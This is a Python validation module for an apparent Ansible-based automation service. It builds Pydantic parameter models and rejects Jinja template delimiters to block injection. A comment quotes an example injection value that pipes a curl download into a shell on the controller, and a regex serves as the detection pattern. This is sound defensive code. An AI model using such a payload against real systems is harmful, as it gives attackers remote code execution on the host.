"""Action parameter validation helper.

Builds a Pydantic model on the fly from an ``ActionDefinition``'s
parameter schema so callers (the ``/api/actions/runs`` endpoint, the
``/api/scheduled-actions`` endpoints, the GitOps importer) all reject
malformed parameter dicts the same way and with the same error
messages.

The current alternative — hand-rolled "missing required parameters"
checks — silently allows type-mismatched parameters (a string where
an int was expected, etc.) through to the orchestrator. The dynamic
model surfaces those at the API boundary instead.
"""

from __future__ import annotations

import re
from typing import Annotated, Any, Literal

from pydantic import AfterValidator, BaseModel, ConfigDict, Field, create_model

from app.actions.types import ActionDefinition, ActionParameter

#: Template delimiters that make a parameter value executable.
#:
#: Action-run parameters are handed to ansible-runner as extra-vars, and
#: Ansible does not mark extra-vars ``!unsafe``. The moment a playbook
#: templates one — a ``msg:``, a ``when:``, a ``template:`` src — a value
#: like ``{{ lookup('pipe', 'curl … | sh') }}`` is evaluated **on the
#: Ansible controller**, which is the LabDog host itself, as the labdog
#: user. Not on the target. That is the case SECURITY.md names as serious,
#: and it was reachable from an ordinary ``POST /api/actions/runs`` body.
#:
#: Rejected at the boundary rather than escaped. ``wrap_var`` /
#: ``AnsibleUnsafeText`` is the documented way to mark a value untrusted,
#: but it does not survive this path: ansible-runner serialises extravars
#: to a JSON artefact on disk before ansible-core ever parses them, so the
#: Python marker object is long gone by the time templating happens.
#:
#: ``{#`` is included because a comment can close and reopen around an
#: expression, and ``}}``/``%}`` because a value spliced into the middle
#: of an existing template expression escapes it from the other side.
_TEMPLATE_DELIMITERS = re.compile(r"\{\{|\}\}|\{%|%\}|\{#|#\}")


def _reject_template_syntax(value: str) -> str:
    """Refuse a parameter value carrying Jinja delimiters."""
    if _TEMPLATE_DELIMITERS.search(value):
        raise ValueError(
            "template delimiters ({{, }}, {%, %}, {#, #}) are not allowed in "
            "action parameters — the value is evaluated on the LabDog host, "
            "not on the target"
        )
    return value


#: ``str`` that cannot carry a template expression. Used for every
#: free-text parameter; ``int``/``bool`` cannot express one, and ``choice``
#: is constrained to a ``Literal`` of the manifest's own values.
SafeStr = Annotated[str, AfterValidator(_reject_template_syntax)]

#: Key under which a dry run is carried inside ``ActionRun.parameters``.
#:
#: Not an action parameter, and never accepted from a client: the API sets
#: it from ``RunCreateBody.dry_run`` and strips any inbound copy. It lives
#: in the parameters blob because that is the only per-run payload the
#: Celery tasks receive — ``ActionRun`` has no column of its own for it.
#:
#: The double underscore keeps it out of the namespace a manifest would
#: plausibly use, and the models built by :func:`build_param_model` reject
#: it like any other undeclared key, which is what makes stripping it at
#: the boundary necessary rather than optional.
DRY_RUN_PARAM = "__dry_run"

_PYDANTIC_TYPE: dict[str, Any] = {
    "string": SafeStr,
    "int": int,
    "bool": bool,
}


def _annotation_for(p: ActionParameter) -> tuple[Any, Any]:
    """Pydantic ``(annotation, default)`` tuple for one parameter."""
    if p.type == "choice":
        if p.choices is None or len(p.choices) == 0:
            # Manifest validation should keep this from happening, but
            # a bad row could theoretically arrive — fall back to a
            # template-checked string rather than a bare one, so the
            # degraded path is not the permissive one.
            ann: Any = SafeStr
        else:
            ann = Literal[tuple(p.choices)]  # type: ignore[valid-type]
    else:
        ann = _PYDANTIC_TYPE[p.type]

    if p.required and p.default is None:
        return ann, Field(...)
    return ann | None, Field(default=p.default)  # type: ignore[operator]


def build_param_model(action: ActionDefinition) -> type[BaseModel]:
    """Construct a Pydantic model that validates this action's parameters.

    The model name is ``ActionParams_{key}`` with non-identifier chars
    replaced. It uses ``extra="forbid"`` so unknown parameter keys are
    rejected — operators get a clear error rather than a silently-ignored
    typo.
    """
    fields = {p.key: _annotation_for(p) for p in action.parameters}
    model_name = "ActionParams_" + "".join(c if c.isalnum() else "_" for c in action.key)
    return create_model(  # type: ignore[call-overload]
        model_name,
        __config__=ConfigDict(extra="forbid"),
        **fields,
    )
